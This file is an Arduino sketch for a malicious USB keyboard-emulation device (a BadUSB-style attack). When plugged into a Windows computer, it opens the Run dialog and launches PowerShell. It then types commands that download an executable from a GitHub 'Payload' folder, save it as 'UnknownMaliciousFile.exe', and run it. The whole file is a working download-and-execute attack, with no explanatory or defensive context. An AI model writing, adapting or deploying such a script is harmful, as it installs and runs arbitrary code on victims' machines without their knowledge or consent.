#include<Keyboard.h>

void setup(){
  Keyboard.begin();
  delay(1000);
  
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  
  Keyboard.press(KEY_LEFT_GUI);
  delay(500); 
  
  Keyboard.press('r');
  delay(500); 
  
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  
  Keyboard.println("powershell");
  delay(500); 
  
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500); 
  
  Keyboard.println("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe'");
  Keyboard.println("$output = 'UnknownMaliciousFile.exe'");
  Keyboard.println("wget $url -outfile $output");
  Keyboard.println("Start-Process -FilePath 'UnknownMaliciousFile.exe'");
  Keyboard.println("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  
  Keyboard.end();
} 

void loop(){ 

}
